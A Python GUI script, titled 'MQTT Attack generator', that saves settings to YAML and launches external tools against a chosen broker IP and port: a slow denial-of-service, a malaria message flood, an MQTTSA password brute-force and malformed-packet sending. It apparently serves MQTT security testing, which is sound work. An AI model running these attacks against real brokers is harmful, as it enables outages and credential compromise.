import PySimpleGUI as sg
import yaml
import subprocess
import time

sg.theme('Default')

# Function to save the configuration to a YAML file
def save_config(filename, config_data):
    with open(filename, 'w') as f:
        yaml.dump(config_data, f)

# Function to load the configuration from a YAML file
def load_config(filename):
    with open(filename, 'r') as f:
        config_data = yaml.safe_load(f)
    return config_data

# Create the layout for the GUI
layout = [
    [sg.Text('Target:')],
    [sg.Text('IP: '), sg.InputText(size=20, key='IP'), sg.Text('Port: '), sg.InputText(size=20, key='port')],
    [sg.Text('Attack'), sg.Text(' Enabled'), sg.Text('Keep-Alive'), sg.Text('Duration'), sg.Text('Message Count'), sg.Text('Processes'), sg.Text('Message Size'), sg.Text('Username'), sg.Text('Wordlist')],
    [sg.Text('SlowDoS'), sg.Checkbox('', key='slowdos_enabled'), sg.InputText(size=6, key='slowdos_keepalive'), sg.InputText(size=6, key='slowdos_duration'), sg.Text('', size=(10, 1))],
    [sg.Text('Malaria'), sg.Checkbox('', key='malaria_enabled'), sg.Text('', size=(10, 1)), sg.Text('', size=(10, 1)), sg.InputText(size=6, key='malaria_message_count'), sg.InputText(size=6, key='malaria_processes'), sg.InputText(size=6, key='malaria_message_size'), sg.Text('', size=(10, 1))],
    [sg.Text('Brute Force'), sg.Checkbox('', key='bruteforce_enabled'), sg.Text('', size=(10, 1)), sg.Text('', size=(10, 1)), sg.Text('', size=(10, 1)), sg.Text('', size=(10, 1)), sg.Text('', size=(10, 1)), sg.InputText(size=20, key='bruteforce_username'), sg.InputText(size=20, key='bruteforce_wordlist')],
    [sg.Text('Malformed'), sg.Checkbox('', key='malformed_enabled'), sg.Text('', size=(10, 1)), sg.Text('', size=(10, 1)), sg.Text('', size=(10, 1)), sg.Text('', size=(10, 1)), sg.Text('', size=(10, 1)), sg.Text('', size=(20, 1)), sg.Text('', size=(20, 1))],
    [sg.Button('Save'), sg.Button('RUN'), sg.Button('Load'), sg.Button('Exit', key='bExit')],
    [sg.Text(key='msg', size=40)]
]

# Create the window
window = sg.Window('MQTT Attack generator', layout)

while True:
    event, values = window.read()

    if event == sg.WIN_CLOSED or event == 'bExit':
        break

    if event == 'Save':
        config_data = {
            'scriptConfigurations': []
        }

        if values['slowdos_enabled']:
            slowdos_data = {
                'mode': 'slowdos',
                'slow_dos_path': '/home/jishnusen/Desktop/mqtt/MQTT_SlowITe/MQTT_attack_slowITe/MQTT_SlowDoS.py',
                'address': values['IP'],
                'port': int(values['port']),
                'keep_alive': int(values['slowdos_keepalive']),
                'time': int(values['slowdos_duration'])
            }
            config_data['scriptConfigurations'].append(slowdos_data)

        if values['malaria_enabled']:
            malaria_data = {
                'mode': 'malaria',
                'malaria_path': '',
                'address': values['IP'],
                'port': int(values['port']),
                'message_count': int(values['malaria_message_count']),
                'processes': int(values['malaria_processes']),
                'message_size': int(values['malaria_message_size'])
            }
            config_data['scriptConfigurations'].append(malaria_data)

        if values['bruteforce_enabled']:
            bruteforce_data = {
                'mode': 'bruteforce',
                'mqttsa_path': '/home/jishnusen/Desktop/mqtt/mqttsa/mqttsa.py',
                'address': values['IP'],
                'port': int(values['port']),
                'username': values['bruteforce_username'],
                'wordlist': values['bruteforce_wordlist']
            }
            config_data['scriptConfigurations'].append(bruteforce_data)

        if values['malformed_enabled']:
            malformed_data = {
                'mode': 'malformed',
                'mqttsa_path': '/home/jishnusen/Desktop/mqtt/mqttsa/mqttsa.py',
                'address': values['IP'],
                'port': int(values['port'])
            }
            config_data['scriptConfigurations'].append(malformed_data)

        save_config('config.yaml', config_data)
        window['msg'].update('Configuration saved.')

    elif event == 'Load':
        config_data = load_config('config.yaml')

        for operation in config_data['scriptConfigurations']:
            mode = operation['mode']
            if mode == 'slowdos':
                window['slowdos_enabled'].update(True)
                window['slowdos_keepalive'].update(str(operation['keep_alive']))
                window['slowdos_duration'].update(str(operation['time']))
            elif mode == 'malaria':
                window['malaria_enabled'].update(True)
                window['malaria_message_count'].update(str(operation['message_count']))
                window['malaria_processes'].update(str(operation['processes']))
                window['malaria_message_size'].update(str(operation['message_size']))
            elif mode == 'bruteforce':
                window['bruteforce_enabled'].update(True)
                window['bruteforce_username'].update(operation['username'])
                window['bruteforce_wordlist'].update(operation['wordlist'])
            elif mode == 'malformed':
                window['malformed_enabled'].update(True)

        window['msg'].update('Configuration loaded.')

    elif event == 'RUN':
        config_data = load_config('config.yaml')
        window['msg'].update('Running attacks...')
        
        for operation in config_data['scriptConfigurations']:
            mode = operation['mode']
            if mode == 'slowdos':
                window['msg'].update('Running SlowDoS attack...')
                slow_dos_path = operation['slow_dos_path']
                address = operation['address']
                port = operation['port']
                keep_alive = operation['keep_alive']
                time_duration = operation['time']

                slow_dos_process = subprocess.Popen(['python3', slow_dos_path, '-a', address, '-p', str(port), '-k', str(keep_alive)])

                time.sleep(time_duration)

                slow_dos_process.kill()
                window['msg'].update('SlowDoS attack completed.')

            elif mode == 'malaria':
                window['msg'].update('Running Malaria attack...')
                malaria_command = ['/home/jishnusen/Desktop/mqtt/mqtt-malaria/malaria', 'publish', '-H', operation['address'], '-n', str(operation['message_count']), '-P', str(operation['processes']), '-s', str(operation['message_size'])]
                subprocess.run(malaria_command)
                window['msg'].update('Malaria attack completed.')

            elif mode == 'bruteforce':
                window['msg'].update('Running Brute Force attack...')
                mqttsa_path = operation['mqttsa_path']
                address = operation['address']
                port = operation['port']
                username = operation['username']
                wordlist = operation['wordlist']

                other_process = subprocess.Popen(['python3', mqttsa_path, '-p', str(port), '-u', username, '-w', wordlist, address])
                window['msg'].update('Brute Force attack completed.')

            elif mode == 'malformed':
                window['msg'].update('Running Malformed attack...')
                mqttsa_path = operation['mqttsa_path']
                address = operation['address']

                malformed_process = subprocess.Popen(['python3', mqttsa_path, '--md', address])
                window['msg'].update('Malformed attack completed.')

        window['msg'].update('Attacks executed.')

window.close()

